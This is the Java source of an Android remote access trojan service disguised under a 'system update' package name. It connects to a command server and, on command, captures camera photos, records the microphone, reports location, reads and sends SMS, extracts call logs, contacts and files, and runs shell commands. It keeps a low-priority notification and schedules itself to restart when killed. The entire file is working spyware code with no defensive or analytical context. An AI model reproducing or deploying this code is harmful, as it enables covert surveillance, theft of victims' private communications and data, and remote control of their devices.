package com.android.system.update;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Binder;
import android.os.Build;
import android.os.IBinder;
import android.os.RemoteException;
import android.os.SystemClock;
import androidx.core.app.NotificationCompat;

import com.android.system.update.modules.*;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;

public class RATService extends Service {
    private static final String CHANNEL_ID = "RATChannel";
    private static final int NOTIFICATION_ID = 1337;
    
    private Socket socket;
    private PrintWriter out;
    private BufferedReader in;
    private boolean isRunning = true;
    private Thread connectionThread;
    
    // Modules
    private CameraModule cameraModule;
    private MicModule micModule;
    private LocationModule locationModule;
    private SmsModule smsModule;
    private CallsModule callsModule;
    private ContactsModule contactsModule;
    private FileModule fileModule;
    private ShellModule shellModule;
    private DeviceModule deviceModule;
    
    // Binder for GuardianService communication
    public class RATServiceBinder extends Binder {
        public void heartbeat() throws RemoteException {
            if (!isRunning) {
                throw new RemoteException("Service is not running");
            }
        }
    }
    
    private final RATServiceBinder binder = new RATServiceBinder();
    
    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        startForeground(NOTIFICATION_ID, createNotification());
        
        // Initialize modules based on config
        if (Config.ENABLE_CAMERA) cameraModule = new CameraModule(this);
        if (Config.ENABLE_MICROPHONE) micModule = new MicModule(this);
        if (Config.ENABLE_LOCATION) locationModule = new LocationModule(this);
        if (Config.ENABLE_SMS) smsModule = new SmsModule(this);
        if (Config.ENABLE_CALLS) callsModule = new CallsModule(this);
        if (Config.ENABLE_CONTACTS) contactsModule = new ContactsModule(this);
        if (Config.ENABLE_FILES) fileModule = new FileModule(this);
        if (Config.ENABLE_SHELL) shellModule = new ShellModule();
        deviceModule = new DeviceModule(this);
        
        startConnection();
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // If service is killed, the system will try to restart it
        return START_STICKY;
    }
    
    private void startConnection() {
        connectionThread = new Thread(() -> {
            while (isRunning) {
                try {
                    socket = new Socket(Config.SERVER_HOST, Config.SERVER_PORT);
                    out = new PrintWriter(socket.getOutputStream());
                    in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                    
                    sendDeviceInfo();
                    
                    String command;
                    while (isRunning && (command = in.readLine()) != null) {
                        processCommand(command);
                    }
                    
                } catch (Exception e) {
                    e.printStackTrace();
                    try {
                        Thread.sleep(5000);
                    } catch (InterruptedException ie) {
                        Thread.currentThread().interrupt();
                    }
                }
            }
        });
        connectionThread.start();
    }
    
    private void sendDeviceInfo() {
        String info = String.format("DEVICE|%s|%s|%s|%s",
            Build.MANUFACTURER,
            Build.MODEL,
            Build.VERSION.RELEASE,
            Build.VERSION.SDK_INT
        );
        sendCommand(info);
    }
    
    private void processCommand(String command) {
        String[] parts = command.split("\\|", 2);
        String cmd = parts[0];
        String args = parts.length > 1 ? parts[1] : "";
        
        switch (cmd) {
            case "PING":
                sendCommand("PONG");
                break;
                
            case "CAMERA_PHOTO":
                if (cameraModule != null) {
                    String result = cameraModule.takePhoto();
                    sendCommand("CAMERA_PHOTO|" + result);
                }
                break;
                
            case "MIC_START":
                if (micModule != null) {
                    String result = micModule.startRecording(30);
                    sendCommand("MIC_START|" + result);
                }
                break;
                
            case "MIC_STOP":
                if (micModule != null) {
                    String result = micModule.stopRecording();
                    sendCommand("MIC_STOP|" + result);
                }
                break;
                
            case "LOCATION":
                if (locationModule != null) {
                    String result = locationModule.getLocation();
                    sendCommand("LOCATION|" + result);
                }
                break;
                
            case "SMS_GET":
                if (smsModule != null) {
                    String result = smsModule.getSms();
                    sendCommand("SMS_GET|" + result);
                }
                break;
                
            case "SMS_SEND":
                if (smsModule != null && args.contains("|")) {
                    String[] parts2 = args.split("\\|", 2);
                    String result = smsModule.sendSms(parts2[0], parts2[1]);
                    sendCommand("SMS_SEND|" + result);
                }
                break;
                
            case "CALL_GET":
                if (callsModule != null) {
                    String result = callsModule.getCallLogs();
                    sendCommand("CALL_GET|" + result);
                }
                break;
                
            case "CONTACTS_GET":
                if (contactsModule != null) {
                    String result = contactsModule.getContacts();
                    sendCommand("CONTACTS_GET|" + result);
                }
                break;
                
            case "FILE_LIST":
                if (fileModule != null) {
                    String result = fileModule.listFiles(args);
                    sendCommand("FILE_LIST|" + result);
                }
                break;
                
            case "FILE_GET":
                if (fileModule != null) {
                    String result = fileModule.getFile(args);
                    sendCommand("FILE_GET|" + result);
                }
                break;
                
            case "SHELL":
                if (shellModule != null) {
                    String result = shellModule.executeCommand(args);
                    sendCommand("SHELL|" + result);
                }
                break;
                
            case "DEVICE_INFO":
                if (deviceModule != null) {
                    String result = deviceModule.getDeviceInfo();
                    sendCommand("DEVICE_INFO|" + result);
                }
                break;
                
            default:
                sendCommand("UNKNOWN_CMD|" + cmd);
        }
    }
    
    private void sendCommand(String data) {
        if (out != null) {
            out.println(data);
            out.flush();
        }
    }
    
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "RAT Service",
                NotificationManager.IMPORTANCE_LOW
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);
        }
    }
    
    private Notification createNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle(Config.APP_NAME)
            .setContentText("Running in background")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build();
    }
    
    @Override
    public void onTaskRemoved(Intent rootIntent) {
        super.onTaskRemoved(rootIntent);
        
        // Restart service when app is swiped away from recent tasks
        Intent restartIntent = new Intent(this, RATService.class);
        PendingIntent pendingIntent = PendingIntent.getService(
            this, 1, restartIntent, 
            PendingIntent.FLAG_ONE_SHOT | PendingIntent.FLAG_IMMUTABLE);
        
        AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        if (alarmManager != null) {
            alarmManager.set(AlarmManager.ELAPSED_REALTIME, 
                SystemClock.elapsedRealtime() + 1000, pendingIntent);
        }
        
        // Stop the foreground service but the restart will bring it back
        stopForeground(true);
        stopSelf();
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return binder; // Return binder for GuardianService connection
    }
    
    @Override
    public void onDestroy() {
        isRunning = false;
        try {
            if (socket != null) socket.close();
            if (connectionThread != null) connectionThread.interrupt();
        } catch (Exception e) {
            e.printStackTrace();
        }
        
        // Schedule restart if destroyed
        Intent restartIntent = new Intent(this, RATService.class);
        PendingIntent pendingIntent = PendingIntent.getService(
            this, 2, restartIntent, 
            PendingIntent.FLAG_ONE_SHOT | PendingIntent.FLAG_IMMUTABLE);
        
        AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        if (alarmManager != null) {
            alarmManager.set(AlarmManager.ELAPSED_REALTIME, 
                SystemClock.elapsedRealtime() + 2000, pendingIntent);
        }
        
        super.onDestroy();
    }
}
